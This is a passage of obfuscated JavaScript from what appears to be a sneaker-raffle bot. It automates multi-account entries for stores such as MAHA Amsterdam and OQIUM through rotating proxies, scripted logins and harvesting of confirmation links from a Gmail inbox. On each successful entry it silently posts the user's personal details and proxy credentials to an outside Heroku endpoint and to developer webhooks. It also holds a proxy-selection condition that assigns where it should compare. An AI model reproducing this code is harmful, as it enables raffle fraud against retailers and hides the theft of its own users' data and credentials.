                        if (_0x1940dd['useRandomProxy'] = ![])
                            var _0x31058d = _0xe8e1dc[_0x309370]['split'](':');
                        else
                            var _0x427c92 = Math['round'](Math['random']() * (_0xe8e1dc['length'] - 0x1)), _0x31058d = _0xe8e1dc[_0x427c92]['split'](':');
                        var _0x433736;
                        try {
                            _0x433736 = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x31058d[0x0] + ':' + _0x31058d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x433736 = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x31058d[0x0] + ':' + _0x31058d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4fc12d = await _0x433736['newPage']();
                            await _0x4fc12d['authenticate']({
                                'username': '' + _0x31058d[0x2],
                                'password': '' + _0x31058d[0x3]
                            }), console['log'](_0x1fc391() + '\x20[' + _0x53d311['name'] + ']\x20Task\x20' + (_0x309370 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4fc12d['setRequestInterception'](!![]), _0x4fc12d['on']('request', _0x55f669 => {
                                _0x55f669['resourceType']() === 'image' || _0x55f669['resourceType']() === 'font' || _0x55f669['resourceType']() === 'media' ? _0x55f669['abort']() : _0x55f669['continue']();
                            }), await _0x4fc12d['goto']('' + _0x592b8a[_0x309370]['Url'], { 'waitUntil': 'networkidle2' }), await _0xf09eb2(0x12c), await _0x4fc12d['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x4fc12d['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xf09eb2(0x7d0);
                            try {
                                await _0x4fc12d['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x4fc12d['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x1fc391() + '\x20[' + _0x53d311['name'] + ']\x20Task\x20' + (_0x309370 + 0x1) + '\x20:\x20Logging\x20in'), await _0x4fc12d['waitForSelector']('#username'), await _0x4fc12d['type']('#username', _0x592b8a[_0x309370]['Email']), await _0x4fc12d['waitForSelector']('#password'), await _0x4fc12d['type']('#password', _0x592b8a[_0x309370]['Password']), await _0xf09eb2(0x190), await _0x4fc12d['click']('#buttonSubmit'), await _0x4fc12d['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x1fc391() + '\x20[' + _0x53d311['name'] + ']\x20Task\x20' + (_0x309370 + 0x1) + '\x20:\x20Getting\x20Product'), await _0xf09eb2(0x1f4), console['log'](_0x1fc391() + '\x20[' + _0x53d311['name'] + ']\x20Task\x20' + (_0x309370 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x592b8a[_0x309370]['Size']);
                            let _0x379bad = _0x592b8a[_0x309370]['Size']['replace']('.5', '\x201/2');
                            if (_0x379bad['toUpperCase']() == 'RANDOM') {
                                const _0x203f2 = await _0x4fc12d['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x473b3a = Math['round'](Math['random']() * (_0x203f2['length'] - 0x1));
                                await _0x203f2[_0x473b3a]['click']();
                            } else
                                await _0x4fc12d['click']('button[aria-label=\x22' + _0x379bad + '\x22]');
                            await _0xf09eb2(0x1f4);
                            try {
                                await _0x4fc12d['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0xf09eb2(0x12c), console['log'](_0x1fc391() + '\x20[' + _0x53d311['name'] + ']\x20Task\x20' + (_0x309370 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x4fc12d['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0xf09eb2(0x12c), await _0x4fc12d['type']('#dwfrm_raffle_addressFields_firstName', _0x592b8a[_0x309370]['FirstName']), await _0xf09eb2(0x12c), await _0x4fc12d['type']('#dwfrm_raffle_addressFields_lastName', _0x592b8a[_0x309370]['LastName']), await _0xf09eb2(0x12c), await _0x4fc12d['select']('#dwfrm_raffle_addressFields_country', _0x592b8a[_0x309370]['Country']), await _0xf09eb2(0x12c), await _0x4fc12d['type']('#dwfrm_raffle_addressFields_city', _0x592b8a[_0x309370]['City']), await _0xf09eb2(0x12c);
                            _0x592b8a[_0x309370]['Postcode'] == undefined && (_0x592b8a[_0x309370]['Postcode'] = _0x592b8a[_0x309370]['Zip']);
                            await _0x4fc12d['type']('#dwfrm_raffle_addressFields_postalCode', _0x592b8a[_0x309370]['Postcode']), await _0xf09eb2(0x12c), await _0x4fc12d['type']('#dwfrm_raffle_addressFields_address1', _0x592b8a[_0x309370]['Address1']), await _0xf09eb2(0x12c), await _0x4fc12d['type']('#dwfrm_raffle_addressFields_address2', _0x592b8a[_0x309370]['HouseNumber']), await _0xf09eb2(0x12c), await _0x4fc12d['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x592b8a[_0x309370]['Address2']), await _0xf09eb2(0x12c), await _0x4fc12d['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0xf09eb2(0x12c), await _0x4fc12d['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x592b8a[_0x309370]['Follower']), await _0xf09eb2(0x1f4), await _0x4fc12d['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0xf09eb2(0x1f4), console['log'](_0x1fc391() + '\x20[' + _0x53d311['name'] + ']\x20Task\x20' + (_0x309370 + 0x1) + '\x20:\x20' + _0x4f1d86['blue']('Awaiting\x20Paypal\x20Payment')), await _0x4fc12d['click']('.b-paypal_button');
                            try {
                                await _0x4fc12d['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x4719eb = 'no', _0x3ed4cd(_0x592b8a[_0x309370], _0x53d311), console['log'](_0x4f1d86['green'](_0x1fc391() + '\x20[' + _0x53d311['name'] + ']\x20Task\x20' + (_0x309370 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x20430b['succesDEVMSG']);
                                await _0xf09eb2(0xc8), await _0x58a176(_0x2faedb, _0x20430b['succesDEVMSG']), await _0xf09eb2(0xc8), await _0x58a176(_0x443f6, _0x20430b['succesPUBMSG']);
                                let _0x2dd359 = _0x592b8a[_0x309370];
                                try {
                                    prxdata = {
                                        'username': _0x1c4b49['replace']('#', ''),
                                        'module': _0x53d311['name'],
                                        'entrydata': JSON['stringify'](_0x2dd359),
                                        'proxy': '' + _0xe8e1dc[_0x309370]
                                    };
                                    var _0x205eff = JSON['stringify'](prxdata);
                                    let _0x5c18b1 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x12ee7a['post']('https://jraffles.herokuapp.com/success', _0x205eff, _0x5c18b1);
                                } catch (_0x5c9c2a) {
                                }
                            } catch (_0x104e37) {
                                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x53d311['name'] + ']\x20Task\x20' + (_0x309370 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x104e37)), _0x1efe05 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x104e37;
                                var _0x2a6840 = await _0x22cd2f(_0x592b8a[_0x309370], _0x53d311, 'dev', !![], _0x1efe05);
                                _0x20430b['errorDEV'] = { 'embeds': [_0x2a6840] }, _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x20430b['errorDEV']), await _0x58a176(_0x45f55a, _0x20430b['errorDEV']);
                            }
                        } catch (_0x24d677) {
                            console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x53d311['name'] + ']\x20Task\x20' + (_0x309370 + 0x1) + '\x20:\x20' + _0x24d677)), _0x1efe05 = '' + _0x24d677;
                            var _0x2a6840 = await _0x22cd2f(_0x592b8a[_0x309370], _0x53d311, 'dev', !![], _0x1efe05);
                            _0x20430b['errorDEV'] = { 'embeds': [_0x2a6840] }, _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x20430b['errorDEV']), await _0x58a176(_0x45f55a, _0x20430b['errorDEV']), _0x4719eb = 'yes';
                        } finally {
                            _0x433736 && _0x433736['close']();
                            if (_0x4719eb == 'yes' && _0x1fcdf9 != 0x5) {
                                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x53d311['name'] + ']\x20Task\x20' + (_0x309370 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1fcdf9 + '\x20/\x205)')), _0x309370 = _0x309370 - 0x1, _0x1fcdf9 = _0x1fcdf9 + 0x1;
                                continue;
                            }
                            _0x4719eb == 'yes' && _0x1fcdf9 >= 0x5 && (_0x3f94a0(_0x592b8a[_0x309370], _0x53d311), _0x4719eb = 'no', _0x1fcdf9 = 0x0), console['log']('Waiting\x20for\x20' + _0x1940dd['AfewDelay'] + '\x20ms'), await _0xf09eb2(_0x1940dd['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RLhP3P',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'TRdHMm',
                                '$consent_form_version': 0x899638,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0xa799ed, _0x504231, _0x53fe3e) {
                    for (var _0x17f6b1 = 0x0; _0x17f6b1 < _0x504231['length']; _0x17f6b1++) {
                        try {
                            await _0xf6702b(_0x504231, _0x17f6b1);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x5cada3(_0xf67f8, _0x59ace5, _0x58b7cf, _0x3ba16a, _0x1ff905) {
                            var _0x45aa29, _0x51f53d = {}, _0x4d16f6 = [], _0x3b28b0 = {}, _0x9df8b3 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0xf3c20c = Math['round'](Math['random']() * (_0x9df8b3['length'] - 0x1));
                            !_0x3ba16a && (_0x3ba16a = {});
                            if (_0x59ace5 != 'ver') {
                                _0x3e9ae7(_0x58b7cf['name'] + '\x20Task\x20' + (_0xf67f8 + 0x1) + '\x20/\x20' + _0x3ba16a['length'] + '\x20||\x20File:\x20' + _0x5237bc + '\x20Proxies:\x20' + _0x3c7bd9), await _0xf6702b(_0x3ba16a, _0xf67f8), _0x51f53d = _0x58b7cf['data'], _0x51f53d['data']['attributes']['email'] = '' + _0x3ba16a[_0xf67f8]['Email'];
                                if (_0x3ba16a[_0xf67f8]['Size'] == 'RANDOM') {
                                }
                                _0x51f53d['data']['attributes']['properties']['$first_name'] = '' + _0x3ba16a[_0xf67f8]['FirstName'], _0x51f53d['data']['attributes']['properties']['$last_name'] = '' + _0x3ba16a[_0xf67f8]['LastName'], _0x51f53d['data']['attributes']['properties']['$address1'] = _0x3ba16a[_0xf67f8]['Address1'] + '\x20' + _0x3ba16a[_0xf67f8]['Address2'] + '\x20' + _0x3ba16a[_0xf67f8]['HouseNumber'], _0x51f53d['data']['attributes']['properties']['$zip'] = '' + _0x3ba16a[_0xf67f8]['Zip'], _0x51f53d['data']['attributes']['properties']['$city'] = '' + _0x3ba16a[_0xf67f8]['City'], _0x51f53d['data']['attributes']['properties']['$country'] = '' + _0x3ba16a[_0xf67f8]['Country'], _0x3ba16a[_0xf67f8]['Size'] == 'RANDOM' ? _0x51f53d['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x9df8b3[_0xf3c20c] : _0x51f53d['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x3ba16a[_0xf67f8]['Size'], _0x51f53d['data']['attributes']['properties']['$phone_number'] = '' + _0x3ba16a[_0xf67f8]['Phone'], _0x51f53d['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x3ba16a[_0xf67f8]['Follower'];
                            }
                            if (_0x1940dd['useRandomProxy'] = ![])
                                var _0x52b3b0 = _0x1ff905[_0xf67f8]['split'](':');
                            else
                                var _0xcaa348 = Math['round'](Math['random']() * (_0x1ff905['length'] - 0x1)), _0x52b3b0 = _0x1ff905[_0xcaa348]['split'](':');
                            var _0x18db0a = {
                                'jar': _0x4cd5d1,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x58b7cf['url'],
                                'headers': _0x58b7cf['headers'],
                                'body': JSON['stringify'](_0x51f53d),
                                'proxy': 'http://' + _0x52b3b0[0x2] + ':' + _0x52b3b0[0x3] + '@' + _0x52b3b0[0x0] + ':' + _0x52b3b0[0x1]
                            };
                            return _0x59ace5 != 'ver' && (_0x18db0a['url'] = _0x58b7cf['url'], _0x18db0a['headers'] = _0x58b7cf['headers']), _0x59ace5 == 'ver' && (_0x18db0a['method'] = 'GET'), new Promise(function (_0x235ec6, _0x5092d4) {
                                callback = async (_0x2d3f6e, _0x520840, _0x59d546) => {
                                    if (!_0x2d3f6e && _0x520840['statusCode'] == 0xca || !_0x2d3f6e && _0x520840['statusCode'] == 0xc8) {
                                        if (_0x59ace5 != 'ver') {
                                            var _0x44b8f4 = await _0x22cd2f(_0x3ba16a[_0xf67f8], _0x58b7cf, 'dev', ![]), _0xd7dfcd = await _0x22cd2f(_0x3ba16a[_0xf67f8], _0x58b7cf, 'pub', ![]);
                                            const _0x13a618 = {
                                                'succesDEVMSG': { 'embeds': [_0x44b8f4] },
                                                'succesPUBMSG': { 'embeds': [_0xd7dfcd] }
                                            };
                                            let _0x360244 = _0x3ba16a[_0xf67f8];
                                            try {
                                                prxdata = {
                                                    'username': _0x1c4b49['replace']('#', ''),
                                                    'module': _0x58b7cf['name'],
                                                    'entrydata': JSON['stringify'](_0x360244),
                                                    'proxy': '' + _0x1ff905[_0xf67f8]
                                                };
                                                var _0xcd837a = JSON['stringify'](prxdata);
                                                let _0x16ae2f = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x12ee7a['post']('https://jraffles.herokuapp.com/success', _0xcd837a, _0x16ae2f);
                                            } catch (_0x41edaa) {
                                            }
                                            if (_0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '')
                                                try {
                                                    await _0x58a176(_0x1940dd['webhook'], _0x13a618['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0xf09eb2(0xc8), await _0x58a176(_0x2faedb, _0x13a618['succesDEVMSG']), await _0xf09eb2(0xc8);
                                            try {
                                                await _0x58a176(_0x443f6, _0x13a618['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x3ed4cd(_0x3ba16a[_0xf67f8], _0x58b7cf);
                                        }
                                        _0x235ec6(console['log'](_0x4f1d86['green'](_0x1fc391() + '\x20[' + _0x58b7cf['name'] + ']\x20Task\x20' + (_0xf67f8 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x59ace5 != 'ver') {
                                            var _0x4f7e95 = '' + _0x2d3f6e, _0x20290b = await _0x22cd2f(_0x3ba16a[_0xf67f8], _0x58b7cf, 'dev', !![], _0x4f7e95), _0x3ac379 = {};
                                            _0x3ac379['errorDEV'] = { 'embeds': [_0x20290b] }, _0x3f94a0(_0x3ba16a[_0xf67f8], _0x58b7cf), _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x3ac379['errorDEV']), await _0x58a176(_0x45f55a, _0x3ac379['errorDEV']);
                                        }
                                        _0x5092d4(console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x58b7cf['name'] + ']\x20Task\x20' + (_0xf67f8 + 0x1) + ':\x20' + _0x2d3f6e)));
                                    }
                                };
                                try {
                                    _0x59ace5 != 'ver' && console['log'](_0x1fc391() + '\x20[' + _0x58b7cf['name'] + ']\x20Task\x20' + (_0xf67f8 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x51f53d['data']['attributes']['email']), _0x31fe1f(_0x18db0a, callback);
                                } catch (_0x37ca6b) {
                                    console['log'](_0x1fc391() + '\x20Task\x20' + (_0xf67f8 + 0x1) + ':\x20' + _0x37ca6b);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x5cada3(_0x17f6b1, 'nor', _0xa799ed, _0x504231, _0x53fe3e), console['log'](_0x1fc391() + '\x20[' + _0xa799ed['name'] + ']\x20Sleeping\x20for\x20' + _0x1940dd['delay'] + '\x20ms'), await _0xf09eb2(_0x1940dd['delay']);
                        } catch (_0x1ed8bb) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x5c01de, _0x2548eb, _0x5aea1c) {
                    var _0x188e22 = [], _0x5d577e = ![];
                    async function _0x14822e() {
                        var _0x205959 = new _0x533159({
                            'user': _0x1940dd['masterMail'],
                            'password': _0x1940dd['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x318864(_0x3f3365) {
                            _0x205959['openBox']('INBOX', ![], _0x3f3365);
                        }
                        _0x205959['once']('ready', function () {
                            _0x318864(function (_0x4ec24f, _0x4396ac) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x4ec24f)
                                    throw _0x4ec24f;
                                _0x205959['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x854117, _0x578053) {
                                    if (!_0x578053 || !_0x578053['length'])
                                        console['log'](_0x1fc391() + '\x20[' + _0x5c01de['name'] + ']\x20No\x20mails\x20found'), _0x205959['end']();
                                    else {
                                        var _0xf1e4af = _0x205959['seq']['fetch'](_0x578053, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0xf1e4af['on']('message', function (_0x1155ba, _0x4bfe90) {
                                            var _0xc407c5 = '(#' + _0x4bfe90 + ')\x20';
                                            _0x1155ba['on']('body', function (_0x3f4648, _0x12073f) {
                                                _0x6212d5(_0x3f4648, (_0x2bddd5, _0x5889e3) => {
                                                    var _0x47a5e9 = _0x5889e3['text']['split']('(')[0x1], _0x2b2660 = _0x47a5e9['split'](')')[0x0];
                                                    _0x188e22['push'](_0x2b2660);
                                                });
                                            }), _0x1155ba['once']('end', function () {
                                            });
                                        }), _0xf1e4af['once']('error', function (_0xa3fd8f) {
                                            console['log']('Fetch\x20error:\x20' + _0xa3fd8f), _0x5d577e = !![];
                                        }), _0xf1e4af['once']('end', function () {
                                            _0x205959['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x205959['once']('error', function (_0x15256d) {
                            console['log'](_0x4f1d86['red'](_0x15256d['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x5d577e = !![];
                        }), _0x205959['once']('end', async function () {
                            _0x5d577e = !![];
                        }), _0x205959['connect']();
                    }
                    async function _0xe779be(_0x3f32fc, _0x1170d7, _0x2023c4) {
                        for (var _0x39da8c = 0x0; _0x39da8c < _0x1170d7['length']; _0x39da8c++) {
                            async function _0x18d279(_0x1e98c3, _0x43ad82, _0x28b64a, _0x946abc, _0x27ed08) {
                                var _0x3ed92b, _0x5212b1 = {}, _0x37f6b4 = [], _0x10a8ba = {}, _0x3398cb = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x3e9258 = Math['round'](Math['random']() * (_0x3398cb['length'] - 0x1));
                                _0x946abc[_0x1e98c3]['Size'] == 'RANDOM' && (_0x946abc[_0x1e98c3]['Size'] = _0x3398cb[_0x3e9258]);
                                !_0x946abc && (_0x946abc = {});
                                if (_0x1940dd['useRandomProxy'] = ![])
                                    var _0xc250a6 = _0x27ed08[_0x1e98c3]['split'](':');
                                else
                                    var _0x19c047 = Math['round'](Math['random']() * (_0x27ed08['length'] - 0x1)), _0xc250a6 = _0x27ed08[_0x19c047]['split'](':');
                                var _0x12769f = {
                                    'jar': _0x4cd5d1,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x28b64a['url'],
                                    'headers': _0x28b64a['headers'],
                                    'body': JSON['stringify'](_0x5212b1),
                                    'proxy': 'http://' + _0xc250a6[0x2] + ':' + _0xc250a6[0x3] + '@' + _0xc250a6[0x0] + ':' + _0xc250a6[0x1]
                                };
                                return _0x43ad82 != 'ver' && (_0x12769f['url'] = _0x28b64a['url'], _0x12769f['headers'] = _0x28b64a['headers']), _0x43ad82 == 'ver' && (_0x12769f['method'] = 'GET', _0x12769f['url'] = _0x946abc[_0x1e98c3]), new Promise(function (_0x7326a8, _0x2017dd) {
                                    callback = async (_0x22784b, _0x309ea0, _0x4232ce) => {
                                        if (!_0x22784b && _0x309ea0['statusCode'] == 0xca || !_0x22784b && _0x309ea0['statusCode'] == 0xc8) {
                                            if (_0x43ad82 != 'ver') {
                                                var _0x22e800 = await _0x22cd2f(_0x946abc[_0x1e98c3], _0x28b64a, 'dev', ![]), _0x42d459 = await _0x22cd2f(_0x946abc[_0x1e98c3], _0x28b64a, 'pub', ![]);
                                                const _0xc8cbe = {
                                                    'succesDEVMSG': { 'embeds': [_0x22e800] },
                                                    'succesPUBMSG': { 'embeds': [_0x42d459] }
                                                };
                                                if (_0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '')
                                                    try {
                                                        await _0x58a176(_0x1940dd['webhook'], _0xc8cbe['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xf09eb2(0xc8), await _0x58a176(_0x2faedb, _0xc8cbe['succesDEVMSG']), await _0xf09eb2(0xc8);
                                                try {
                                                    await _0x58a176(_0x443f6, _0xc8cbe['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x3ed4cd(_0x946abc[_0x1e98c3], _0x28b64a);
                                            }
                                            _0x7326a8(console['log'](_0x4f1d86['green'](_0x1fc391() + '\x20[' + _0x28b64a['name'] + ']\x20Task\x20' + (_0x1e98c3 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x43ad82 != 'ver') {
                                                var _0x9e7c74 = '' + _0x22784b, _0x5e5c7b = await _0x22cd2f(_0x946abc[_0x1e98c3], _0x28b64a, 'dev', !![], _0x9e7c74), _0x2ec05d = {};
                                                _0x2ec05d['errorDEV'] = { 'embeds': [_0x5e5c7b] }, _0x3f94a0(_0x946abc[_0x1e98c3], _0x28b64a), _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x2ec05d['errorDEV']), await _0x58a176(_0x45f55a, _0x2ec05d['errorDEV']);
                                            }
                                            _0x2017dd(console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x28b64a['name'] + ']\x20Task\x20' + (_0x1e98c3 + 0x1) + ':\x20' + _0x22784b)));
                                        }
                                    };
                                    try {
                                        _0x43ad82 != 'ver' ? console['log'](_0x1fc391() + '\x20[' + _0x28b64a['name'] + ']\x20Task\x20' + (_0x1e98c3 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5212b1['data']['attributes']['email']) : console['log'](_0x1fc391() + '\x20[' + _0x28b64a['name'] + ']\x20Task\x20' + (_0x1e98c3 + 0x1) + ':\x20Fetching\x20Response'), _0x31fe1f(_0x12769f, callback);
                                    } catch (_0x141fa0) {
                                        console['log'](_0x1fc391() + '\x20Task\x20' + (_0x1e98c3 + 0x1) + ':\x20' + _0x141fa0);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x18d279(_0x39da8c, 'ver', _0x3f32fc, _0x1170d7, _0x2023c4), console['log'](_0x1fc391() + '\x20[' + _0x3f32fc['name'] + ']\x20Sleeping\x20for\x20' + _0x1940dd['delay'] + '\x20ms'), await _0xf09eb2(_0x1940dd['delay']);
                            } catch (_0x108cc0) {
                            }
                        }
                    }
                    try {
                        _0x14822e();
                        while (!_0x5d577e) {
                            await _0xf09eb2(0xbb8);
                        }
                        console['log']('Found\x20' + _0x188e22['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0xf09eb2(0x9c4);
                    }
                    await _0xe779be(_0x5c01de, _0x188e22, _0x5aea1c);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'X4md8Z',
                            'custom_source': 'DZ4137-106',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WspqGE',
                                '$consent_form_version': 0x89a2a4,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
